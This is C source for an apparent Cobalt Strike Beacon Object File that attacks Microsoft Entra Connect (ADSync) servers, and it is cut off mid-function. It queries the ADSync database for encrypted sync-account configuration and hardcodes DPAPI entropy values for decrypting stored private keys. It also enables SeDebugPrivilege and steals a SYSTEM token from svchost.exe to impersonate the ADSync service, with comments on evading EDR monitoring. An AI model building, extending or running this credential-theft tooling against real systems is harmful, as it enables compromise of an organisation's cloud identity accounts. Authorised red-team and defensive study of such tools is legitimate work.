#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <odbcinst.h>
#include <sqlext.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <bcrypt.h>

#include "beacon.h"

#pragma comment(lib, "legacy_stdio_definitions.lib")


// Printf shorthand for development purposes
#ifdef _DEBUG
#include <stdio.h>
#include <string.h>
#include <winver.h>
#pragma comment(lib, "Version.lib")
#define BeaconPrintf(type, fmt, ...) printf(fmt "\n", __VA_ARGS__)
#endif


// Beacon imports
#ifndef _DEBUG

// KERNEL32
DECLSPEC_IMPORT DWORD KERNEL32$GetLastError();
DECLSPEC_IMPORT HANDLE KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT LPVOID KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT BOOL KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT DWORD KERNEL32$GetFileAttributesW(LPCWSTR lpFileName);
DECLSPEC_IMPORT HANDLE KERNEL32$FindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
DECLSPEC_IMPORT BOOL KERNEL32$FindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
DECLSPEC_IMPORT BOOL KERNEL32$FindClose(HANDLE hFindFile);

// MSVCRT
DECLSPEC_IMPORT PVOID MSVCRT$memcpy(PVOID dst, CONST PVOID src, SIZE_T size);
DECLSPEC_IMPORT SIZE_T MSVCRT$wcslen(CONST WCHAR* str);
DECLSPEC_IMPORT WCHAR* MSVCRT$wcsstr(CONST WCHAR* str, CONST WCHAR* strSearch);

DECLSPEC_IMPORT SIZE_T MSVCRT$strlen(CONST CHAR* str);
DECLSPEC_IMPORT CHAR* MSVCRT$strchr(CONST CHAR* str, CONST CHAR strSearch);
DECLSPEC_IMPORT CHAR* MSVCRT$strstr(CONST CHAR* str, CONST CHAR* strSearch);
DECLSPEC_IMPORT INT WINAPIV MSVCRT$sprintf(LPSTR unnamedParam1, LPCSTR unnamedParam2, ...);
DECLSPEC_IMPORT INT MSVCRT$strncmp(CONST CHAR* string1, CONST CHAR* string2, SIZE_T count);
// USER32
DECLSPEC_IMPORT INT WINAPIV USER32$wsprintfW(LPWSTR unnamedParam1, LPCWSTR unnamedParam2, ...);

// ODBC32
DECLSPEC_IMPORT BOOL ODBCCP32$SQLGetInstalledDriversW(LPSTR lpszBuf, WORD cbBufMax, WORD* pcbBufOut);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLFetch(SQLHSTMT StatementHandle);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLDisconnect(SQLHDBC ConnectionHandle);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLFreeHandle(SQLSMALLINT HandleType, SQLHANDLE Handle);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLExecDirectW(SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLAllocHandle(SQLSMALLINT HandleType, SQLHANDLE InputHandle, SQLHANDLE* OutputHandlePtr);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLSetEnvAttr(SQLHENV EnvironmentHandle, SQLINTEGER Attribute, SQLPOINTER ValuePtr, SQLINTEGER StringLength);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLSetConnectAttrW(SQLHDBC ConnectionHandle, SQLINTEGER Attribute, SQLPOINTER ValuePtr, SQLINTEGER StringLength);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLBindCol(SQLHSTMT StatementHandle, SQLUSMALLINT ColumnNumber, SQLSMALLINT TargetType, SQLPOINTER TargetValuePtr, SQLLEN BufferLength, SQLLEN* StrLen_or_IndPtr);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLGetDiagRecW(SQLSMALLINT HandleType, SQLHANDLE Handle, SQLSMALLINT RecNumber, SQLCHAR* SQLState, SQLINTEGER* NativeErrorPtr, SQLCHAR* MessageText, SQLSMALLINT BufferLength, SQLSMALLINT* TextLengthPtr);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLDriverConnectW(SQLHDBC ConnectionHandle, SQLHWND WindowHandle, SQLCHAR* InConnectionString, SQLSMALLINT StringLength1, SQLCHAR* OutConnectionString, SQLSMALLINT BufferLength, SQLSMALLINT* StringLength2Ptr, SQLUSMALLINT DriverCompletion);

// VERSION
DECLSPEC_IMPORT DWORD VERSION$GetFileVersionInfoSizeW(LPCWSTR lptstrFilename, LPDWORD lpdwHandle);
DECLSPEC_IMPORT BOOL VERSION$GetFileVersionInfoW(LPCWSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData);
DECLSPEC_IMPORT BOOL VERSION$VerQueryValueW(LPCVOID pBlock, LPCWSTR lpSubBlock, LPVOID* lplpBuffer, PUINT puLen);

// KERNEL32 — process enumeration and file I/O for dumpcert
DECLSPEC_IMPORT HANDLE KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
DECLSPEC_IMPORT BOOL KERNEL32$Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
DECLSPEC_IMPORT BOOL KERNEL32$Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
DECLSPEC_IMPORT HANDLE KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT BOOL KERNEL32$DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
DECLSPEC_IMPORT BOOL ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
DECLSPEC_IMPORT HANDLE KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
DECLSPEC_IMPORT BOOL KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
DECLSPEC_IMPORT DWORD KERNEL32$GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
DECLSPEC_IMPORT VOID KERNEL32$GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime);
DECLSPEC_IMPORT HLOCAL KERNEL32$LocalFree(HLOCAL hMem);

// ADVAPI32 — token manipulation and privilege adjustment
DECLSPEC_IMPORT BOOL ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL ADVAPI32$DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
DECLSPEC_IMPORT BOOL ADVAPI32$ImpersonateLoggedOnUser(HANDLE hToken);
DECLSPEC_IMPORT BOOL ADVAPI32$RevertToSelf();
DECLSPEC_IMPORT BOOL ADVAPI32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
DECLSPEC_IMPORT BOOL ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
DECLSPEC_IMPORT BOOL ADVAPI32$OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
DECLSPEC_IMPORT HANDLE ADVAPI32$GetCurrentThread();

// CRYPT32 — DPAPI decryption and certificate store operations
DECLSPEC_IMPORT BOOL CRYPT32$CryptUnprotectData(DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr, DATA_BLOB* pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags, DATA_BLOB* pDataOut);
DECLSPEC_IMPORT HCERTSTORE CRYPT32$CertOpenStore(LPCSTR lpszStoreProvider, DWORD dwEncodingType, ULONG_PTR hCryptProv, DWORD dwFlags, CONST void* pvPara);
DECLSPEC_IMPORT PCCERT_CONTEXT CRYPT32$CertFindCertificateInStore(HCERTSTORE hCertStore, DWORD dwCertEncodingType, DWORD dwFindFlags, DWORD dwFindType, CONST void* pvFindPara, PCCERT_CONTEXT pPrevCertContext);
DECLSPEC_IMPORT BOOL CRYPT32$CertFreeCertificateContext(PCCERT_CONTEXT pCertContext);
DECLSPEC_IMPORT BOOL CRYPT32$CertCloseStore(HCERTSTORE hCertStore, DWORD dwFlags);
DECLSPEC_IMPORT BOOL CRYPT32$CryptAcquireCertificatePrivateKey(PCCERT_CONTEXT pCert, DWORD dwFlags, void* pvParameters, ULONG_PTR* phCryptProvOrNCryptKey, DWORD* pdwKeySpec, BOOL* pfCallerFreeProvOrNCryptKey);

// NCRYPT — key signing and property queries via CNG key storage providers (software + TPM)
DECLSPEC_IMPORT LONG NCRYPT$NCryptSignHash(ULONG_PTR hKey, VOID* pPaddingInfo, PUCHAR pbHashValue, DWORD cbHashValue, PUCHAR pbSignature, DWORD cbSignature, DWORD* pcbResult, DWORD dwFlags);
DECLSPEC_IMPORT LONG NCRYPT$NCryptGetProperty(ULONG_PTR hObject, LPCWSTR pszProperty, PBYTE pbOutput, DWORD cbOutput, DWORD* pcbResult, DWORD dwFlags);
DECLSPEC_IMPORT LONG NCRYPT$NCryptFreeObject(ULONG_PTR hObject);

// BCRYPT — SHA256 hashing, random generation
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE* phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptHash(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbSecret, ULONG cbSecret, PUCHAR pbInput, ULONG cbInput, PUCHAR pbOutput, ULONG cbOutput);
DECLSPEC_IMPORT NTSTATUS BCRYPT$BCryptGenRandom(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer, ULONG cbBuffer, ULONG dwFlags);

// MSVCRT — additional string functions for dumpcert
DECLSPEC_IMPORT INT MSVCRT$_wcsicmp(CONST WCHAR* string1, CONST WCHAR* string2);
DECLSPEC_IMPORT PVOID MSVCRT$memset(PVOID dst, INT val, SIZE_T size);
DECLSPEC_IMPORT INT WINAPIV MSVCRT$_snprintf(CHAR* buffer, SIZE_T count, CONST CHAR* format, ...);

#endif


// Shorthand for using beacon imports instead of using KERNEL32$...
#ifdef _DEBUG
#define API(x, y) y
#else
#define API(x, y) x##$##y
#endif


// Constants
// %ls = ODBC driver name, %ls = LocalDB instance name (ADSync for v1, ADSync2019 for v2+)
// The \\.\\instancename format (resolves to \.\instancename) is required by the ODBC driver for LocalDB named instances
#define CONNECTION_STRING_FMT L"Driver={%ls};Server=(LocalDB)\\.\\%ls;Database=ADSync;Trusted_Connection=yes"

// Utility macro's / constants
#define BofHeapAlloc(size) API(KERNEL32, HeapAlloc)(API(KERNEL32, GetProcessHeap)(), HEAP_ZERO_MEMORY, size)
#define BofHeapFree(buf) API(KERNEL32, HeapFree)(API(KERNEL32, GetProcessHeap)(), NULL, buf)
#define IS_SQL_SUCCESS(r) (r == SQL_SUCCESS || r == SQL_SUCCESS_WITH_INFO)

#define CONNECT_TIMEOUT 5
#define CONFIG_SIZE 1024 * 32

// Version cutoff: 2.0.3.0 was the first V2 release (July 2021) which switched
// LocalDB from SQL Server 2012 (instance: ADSync) to SQL Server 2019 (instance: ADSync2019)
#define ENTRACONNECT_V2_MAJOR 2

// ABA (Application-Based Authentication / certificate) thresholds (minor version, major always 2):
//   >= 2.4.x : ABA public preview — may or may not be enabled
//   >= 2.6.x : ABA is the default for new installs
#define ENTRACONNECT_ABA_PREVIEW_MINOR 4
#define ENTRACONNECT_ABA_GA_MINOR      6

#define CERT_DIR        L"C:\\Windows\\ServiceProfiles\\ADSync\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates"
#define CERT_DIR_SEARCH L"C:\\Windows\\ServiceProfiles\\ADSync\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates\\*"

// LocalDB instances are stored per-user under the ADSync service profile.
// Enumerating with ADSync* discovers the actual instance name (ADSync, ADSync2019, ADSync2022, etc.)
// regardless of the installed version, avoiding hardcoded version->instance mappings.
#define LOCALDB_INSTANCES_SEARCH L"C:\\Windows\\ServiceProfiles\\ADSync\\AppData\\Local\\Microsoft\\Microsoft SQL Server Local DB\\Instances\\ADSync*"

#define QUERY_PRIVATE_CONFIG L"SELECT private_configuration_xml FROM mms_management_agent;"

// --- dumpcert constants ---
// CNG key blob candidate directories. The private key may be in the ADSync service
// profile (Roaming or Local), the machine-level CNG store, or the SystemCertificates
// Keys subdir depending on the Entra Connect version and key storage provider.
// We try each in order until we find one that exists.
#define CNG_KEY_CANDIDATES_COUNT 4

// DPAPI entropy strings — these include the explicit null terminator as part of the entropy.
// The C# code does Encoding.UTF8.GetBytes("6jnkd5J3ZdQDtrsu\0") which produces 18 bytes.
#define DPAPI_ENTROPY_PRIVPROPS    "6jnkd5J3ZdQDtrsu"   // 17 chars + \0 = 18 bytes
#define DPAPI_ENTROPY_PRIVPROPS_LEN 18
#define DPAPI_ENTROPY_PRIVKEY      "xT5rZW5qVVbrvpuA"   // 17 chars + \0 = 18 bytes
#define DPAPI_ENTROPY_PRIVKEY_LEN   18

// CNG key blob header (44 bytes, packed)
#pragma pack(push, 1)
typedef struct {
    DWORD Version;
    DWORD Unknown1;
    DWORD NameLen;          // Unicode key name length in bytes
    DWORD Type;
    DWORD PublicPropertiesLen;
    DWORD PrivatePropertiesLen;
    DWORD PrivateKeyLen;
    BYTE  Unknown2[16];
} CNG_KEY_HEADER;
#pragma pack(pop)

// BCRYPT_PKCS1_PADDING_INFO — for RSA PKCS#1 v1.5 signature
typedef struct {
    LPCWSTR pszAlgId;
} MY_BCRYPT_PKCS1_PADDING_INFO;

// BCrypt constants that may not be in mingw headers
#ifndef BCRYPT_PAD_PKCS1
#define BCRYPT_PAD_PKCS1 0x00000002
#endif

// CertOpenStore / CryptAcquireCertificatePrivateKey constants
#ifndef CERT_STORE_PROV_SYSTEM_W
#define CERT_STORE_PROV_SYSTEM_W ((LPCSTR)10)
#endif
#ifndef CERT_SYSTEM_STORE_CURRENT_USER
#define CERT_SYSTEM_STORE_CURRENT_USER 0x00010000
#endif
#ifndef CERT_STORE_OPEN_EXISTING_FLAG
#define CERT_STORE_OPEN_EXISTING_FLAG 0x00004000
#endif
#ifndef CERT_FIND_HASH
#define CERT_FIND_HASH 0x00010000
#endif
#ifndef CRYPT_ACQUIRE_ONLY_NCRYPT_KEY_FLAG
#define CRYPT_ACQUIRE_ONLY_NCRYPT_KEY_FLAG 0x00040000
#endif
#ifndef CRYPT_ACQUIRE_SILENT_FLAG
#define CRYPT_ACQUIRE_SILENT_FLAG 0x00000040
#endif
#ifndef CERT_NCRYPT_KEY_SPEC
#define CERT_NCRYPT_KEY_SPEC 0xFFFFFFFF
#endif

// Base64 encoding table
static CONST CHAR b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// JWT audience format
#define JWT_AUD_FMT "https://login.microsoftonline.com/%s/oauth2/v2.0/token"

// Max sizes for JWT components
#define JWT_MAX_HEADER  256
#define JWT_MAX_CLAIMS  1024
#define JWT_MAX_B64     4096
#define JWT_MAX_ASSERTION 8192

typedef struct {
    BOOL  found;
    DWORD major;
    DWORD minor;
    DWORD build;
    DWORD revision;
    CONST WCHAR* filePath;
} ENTRACONNECT_VERSION;


// Helper functions
CHAR* html_unescape(CHAR* str) {
    INT len = API(MSVCRT, strlen)(str);
    CHAR* result = BofHeapAlloc(len + 1);
    INT offset = 0;

    for (INT i = 0; i < len; i++) {
        if (str[i] == '&') {
            if (API(MSVCRT, strncmp)(str + i, "&lt;", 4) == 0) {
                result[offset++] = '<';
                i += 3;
            }
            else if (API(MSVCRT, strncmp)(str + i, "&gt;", 4) == 0) {
                result[offset++] = '>';
                i += 3;
            }
            else if (API(MSVCRT, strncmp)(str + i, "&amp;", 5) == 0) {
                result[offset++] = '&';
                i += 4;
            }
            else {
                result[offset++] = str[i];
            }
        }
        else {
            result[offset++] = str[i];
        }
    }

    result[offset] = '\0';
    return result;
}

CONST CHAR* ptnscan(CONST CHAR* haystack, CONST CHAR* needle) {
    INT haystackLen = API(MSVCRT, strlen)(haystack);
    INT needleLen = API(MSVCRT, strlen)(needle);

    for (INT i = 0; i < haystackLen - needleLen; i++) {
        for (INT j = 0; j < needleLen; j++) {
            if (needle[j] == '?') {
                continue;
            }

            if (haystack[i + j] != needle[j]) {
                break;
            }


            if (j == needleLen - 1) {
                return &haystack[i];
            }

        }
    }

    return NULL;
}

CONST CHAR* find_username(CONST CHAR* xml) {
    CONST CHAR* usernameStart = ptnscan(xml, "name=?UserName? type=");
    CONST CHAR* valueStart = ptnscan(usernameStart, ">") + 1;
    CONST CHAR* valueEnd = ptnscan(valueStart, "</parameter>");
    size_t size = (ptrdiff_t)valueEnd - (ptrdiff_t)valueStart;
    CHAR* unescaped = (CHAR*)BofHeapAlloc(size + 1);
    if (!unescaped) {
        return NULL;
    }

    API(MSVCRT, memcpy)(unescaped, valueStart, size);
    unescaped[size] = '\x00';

    CHAR* escaped = html_unescape(unescaped);
    BofHeapFree(unescaped);
    return escaped;
}

CONST SQLWCHAR* get_last_sql_error(SQLHDBC sqlConnHandle, SQLRETURN sqlResult) {
    SQLWCHAR sqlState[6], errorMessage[SQL_MAX_MESSAGE_LENGTH];
    SQLINTEGER nativeError;
    SQLSMALLINT messageLength;
    CONST WCHAR format[] = L"Return code: 0x%x; SQL state: %ls; Native error: %d; Message: %ls";

    // Size breakdown
    //  format = hard-coded length
    //  sqlmessage = SQL_MAX_MESSAGE_LENGTH
    //  sqlstate = 6 chars
    //  native error code = 8 chars
    //  return code hex = 8 chars (maybe -2, better reserve too many)
    static SQLWCHAR message[SQL_MAX_MESSAGE_LENGTH + sizeof(format) + sizeof(sqlState) + 8 + 8];

    API(ODBC32, SQLGetDiagRecW)(SQL_HANDLE_DBC, sqlConnHandle, 1, sqlState, &nativeError, errorMessage, SQL_MAX_MESSAGE_LENGTH, &messageLength);
    API(USER32, wsprintfW)(message, format, sqlResult, sqlState, nativeError, errorMessage);
    return message;
}

// Discovers the ADSync LocalDB instance name from the service account's filesystem profile.
// Searches for any directory matching ADSync* under the LocalDB instances path, covering all
// known variants (ADSync, ADSync2019, ADSync2022, and future versions).
// Returns a pointer to a static buffer with the instance name, or NULL if not found.
CONST WCHAR* find_localdb_instance() {
    static WCHAR instanceName[260];
    WIN32_FIND_DATAW findData = { 0 };
    INT i;
    HANDLE hFind = API(KERNEL32, FindFirstFileW)(LOCALDB_INSTANCES_SEARCH, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    do {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (findData.cFileName[0] == L'.') continue;

        i = 0;
        while (findData.cFileName[i] && i < 259) {
            instanceName[i] = findData.cFileName[i];
            i++;
        }
        instanceName[i] = L'\0';
        API(KERNEL32, FindClose)(hFind);
        return instanceName;
    } while (API(KERNEL32, FindNextFileW)(hFind, &findData));

    API(KERNEL32, FindClose)(hFind);
    return NULL;
}


// Resolves the LocalDB instance name: uses the caller-supplied override if provided,
// otherwise falls back to filesystem discovery. Returns NULL if neither finds an instance.
CONST WCHAR* resolve_localdb_instance(CONST WCHAR* override) {
    CONST WCHAR* discovered;
    if (override) {
        BeaconPrintf(CALLBACK_OUTPUT, "Using specified LocalDB instance: %ls\n", override);
        return override;
    }
    discovered = find_localdb_instance();
    if (discovered) {
        BeaconPrintf(CALLBACK_OUTPUT, "Discovered LocalDB instance: %ls\n", discovered);
        return discovered;
    }
    return NULL;
}


// Reads Entra Connect version info into ver. Returns FALSE if executable not found or unreadable.
BOOL read_entra_version(ENTRACONNECT_VERSION* ver) {
    CONST WCHAR* candidatePaths[] = {
        L"C:\\Program Files\\Microsoft Azure Active Directory Connect\\ADSync\\Bin\\ADSync.exe",
        L"C:\\Program Files\\Microsoft Azure Active Directory Connect\\AzureADConnect.exe",
    };
    CONST INT numPaths = 2;

    ver->found    = FALSE;
    ver->filePath = NULL;

    for (INT i = 0; i < numPaths; i++) {
        if (API(KERNEL32, GetFileAttributesW)(candidatePaths[i]) != INVALID_FILE_ATTRIBUTES) {
            ver->filePath = candidatePaths[i];
            break;
        }
    }

    if (!ver->filePath) {
        return FALSE;
    }

    DWORD dummy = 0;
    DWORD infoSize = API(VERSION, GetFileVersionInfoSizeW)(ver->filePath, &dummy);
    if (!infoSize) {
        return FALSE;
    }

    BYTE* verBuf = BofHeapAlloc(infoSize);
    if (!verBuf) {
        return FALSE;
    }

    if (!API(VERSION, GetFileVersionInfoW)(ver->filePath, 0, infoSize, verBuf)) {
        BofHeapFree(verBuf);
        return FALSE;
    }

    VS_FIXEDFILEINFO* ffi = NULL;
    UINT ffiLen = 0;
    if (!API(VERSION, VerQueryValueW)(verBuf, L"\\", (LPVOID*)&ffi, &ffiLen) || ffiLen == 0) {
        BofHeapFree(verBuf);
        return FALSE;
    }

    ver->major    = HIWORD(ffi->dwFileVersionMS);
    ver->minor    = LOWORD(ffi->dwFileVersionMS);
    ver->build    = HIWORD(ffi->dwFileVersionLS);
    ver->revision = LOWORD(ffi->dwFileVersionLS);
    ver->found    = TRUE;

    BofHeapFree(verBuf);
    return TRUE;
}

// Returns a pointer to the auth type string and sets authNote based on version.
CONST CHAR* classify_auth_type(CONST ENTRACONNECT_VERSION* ver, CONST CHAR** authNote) {
    if (ver->major < 2 || (ver->major == 2 && ver->minor < ENTRACONNECT_ABA_PREVIEW_MINOR)) {
        *authNote = "Credential dump should work directly.";
        return "Password (Sync_* / MSOL_* user principal)";
    } else if (ver->major == 2 && ver->minor < ENTRACONNECT_ABA_GA_MINOR) {
        *authNote = "Credential dump will work if this install was NOT migrated to Application-Based Authentication (ABA).";
        return "Password by default (ABA/certificate available as preview - v2.4+)";
    } else {
        *authNote = "Credential dump will only work if this install was NOT migrated to ABA. Servers upgraded from older versions may still use password. Run dumpcertinfo to check.";
        return "Application-Based Authentication / certificate (default for new installs - v2.6+)";
    }
}

// Parses private_configuration_xml for the ABA application/client ID.
// Returns heap-allocated string or NULL if not found (password-based config).
CONST CHAR* find_clientid(CONST CHAR* xml) {
    CONST CHAR* start = ptnscan(xml, "name=?UserName? type=");
    if (!start) {
        return NULL;
    }
    CONST CHAR* valueStart = ptnscan(start, ">") + 1;
    CONST CHAR* valueEnd   = ptnscan(valueStart, "</parameter>");
    if (!valueEnd || valueEnd <= valueStart) {
        return NULL;
    }
    size_t size = (ptrdiff_t)valueEnd - (ptrdiff_t)valueStart;
    CHAR* result = (CHAR*)BofHeapAlloc(size + 1);
    if (!result) {
        return NULL;
    }
    API(MSVCRT, memcpy)(result, valueStart, size);
    result[size] = '\x00';
    CHAR* unescaped = html_unescape(result);
    BofHeapFree(result);
    return unescaped;
}


// ============================================================================
// dumpcert helper functions
// ============================================================================

// Enable SeDebugPrivilege on the current process token.
// Returns TRUE on success. Requires the caller to be a local admin.
BOOL enable_debug_privilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;

    if (!API(ADVAPI32, OpenProcessToken)((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open process token: %d\n", API(KERNEL32, GetLastError)());
        return FALSE;
    }

    if (!API(ADVAPI32, LookupPrivilegeValueA)(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to lookup SeDebugPrivilege: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!API(ADVAPI32, AdjustTokenPrivileges)(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enable SeDebugPrivilege: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hToken);
        return FALSE;
    }

    // AdjustTokenPrivileges can return success but not actually enable the privilege
    if (API(KERNEL32, GetLastError)() == ERROR_NOT_ALL_ASSIGNED) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SeDebugPrivilege not available on this token. Are you elevated/local admin?\n");
        API(KERNEL32, CloseHandle)(hToken);
        return FALSE;
    }

    API(KERNEL32, CloseHandle)(hToken);
    return TRUE;
}

// Two-stage SYSTEM token impersonation to reach the ADSync (miiserver.exe) token.
//
// Problem: NT SERVICE\ADSync's token DACL only grants TOKEN_READ to Administrators,
// so OpenProcessToken with TOKEN_DUPLICATE fails even with SeDebugPrivilege.
// SeDebugPrivilege bypasses *process* DACLs but NOT *token* DACLs.
//
// Solution: Steal a SYSTEM token from svchost.exe first (SYSTEM token DACLs are
// permissive to Administrators), impersonate SYSTEM, then open the ADSync token
// (SYSTEM has full access to all tokens on the box).
//
// OPSEC: svchost.exe is the preferred SYSTEM donor — dozens of instances on any
// Windows box make OpenProcess on it far less anomalous than touching lsass.exe
// or winlogon.exe, which are heavily monitored by EDRs.
//
// Requires SeDebugPrivilege to already be enabled.
// Returns the duplicated ADSync token handle on success, NULL on failure.
// Caller must CloseHandle the token and call RevertToSelf() when done.
HANDLE impersonate_adsync() {
    HANDLE hSnapshot = NULL;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;
    HANDLE hAdsyncProcess = NULL;
    HANDLE hAdsyncToken = NULL;
    HANDLE hAdsyncDupToken = NULL;
    PROCESSENTRY32W pe = { 0 };
    DWORD adsyncPid = 0;
    DWORD svchostPid = 0;

    // ---- Stage 0: Enumerate processes to find both svchost.exe and miiserver.exe ----
    hSnapshot = API(KERNEL32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateToolhelp32Snapshot failed: %d\n", API(KERNEL32, GetLastError)());
        return NULL;
    }

    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (!API(KERNEL32, Process32FirstW)(hSnapshot, &pe)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Process32FirstW failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hSnapshot);
        return NULL;
    }

    do {
        if (adsyncPid == 0 && API(MSVCRT, _wcsicmp)(pe.szExeFile, L"miiserver.exe") == 0) {
            adsyncPid = pe.th32ProcessID;
        }
        if (svchostPid == 0 && API(MSVCRT, _wcsicmp)(pe.szExeFile, L"svchost.exe") == 0) {
            // Take the first svchost.exe — they all run as SYSTEM (or LOCAL/NETWORK SERVICE,
            // but we verify the token below). If this one isn't SYSTEM we'll keep looking.
            svchostPid = pe.th32ProcessID;
        }
    } while (API(KERNEL32, Process32NextW)(hSnapshot, &pe));

    // If first svchost wasn't SYSTEM, we may need to try others — re-enumerate below
    API(KERNEL32, CloseHandle)(hSnapshot);

    if (adsyncPid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not find miiserver.exe (ADSync service). Is the service running?\n");
        return NULL;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Found miiserver.exe (PID: %d)\n", adsyncPid);

    if (svchostPid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not find any svchost.exe process\n");
        return NULL;
    }

    // ---- Stage 1: Steal SYSTEM token from svchost.exe ----
    // Try svchost.exe instances until we get one running as SYSTEM.
    // Re-enumerate the full process list so we can try multiple.
    hSnapshot = API(KERNEL32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateToolhelp32Snapshot failed: %d\n", API(KERNEL32, GetLastError)());
        return NULL;
    }

    pe.dwSize = sizeof(PROCESSENTRY32W);
    BOOL gotSystem = FALSE;

    if (API(KERNEL32, Process32FirstW)(hSnapshot, &pe)) {
        do {
            if (API(MSVCRT, _wcsicmp)(pe.szExeFile, L"svchost.exe") != 0) continue;

            hProcess = API(KERNEL32, OpenProcess)(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProcess) continue;

            if (!API(ADVAPI32, OpenProcessToken)(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
                API(KERNEL32, CloseHandle)(hProcess);
                hProcess = NULL;
                continue;
            }

            // Verify this is a SYSTEM token by checking TokenUser
            BYTE tokenUserBuf[64];
            DWORD retLen = 0;
